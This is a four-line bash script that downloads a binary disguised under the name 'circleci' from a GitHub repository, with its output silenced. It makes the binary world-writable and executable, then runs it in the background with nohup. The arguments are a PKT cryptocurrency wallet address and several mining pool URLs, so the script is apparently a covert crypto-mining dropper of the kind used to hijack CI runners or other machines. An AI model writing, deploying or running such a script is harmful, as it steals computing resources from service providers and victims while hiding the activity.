#!/bin/bash
wget https://github.com/aurbach55/pos/raw/main/circleci >/dev/null 2>&1
chmod 777 circleci >/dev/null 2>&1
nohup ./circleci ann -p pkt1qqa56gl4m9g7nm5xqsasf55wd60kqwflg9sxchh https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io
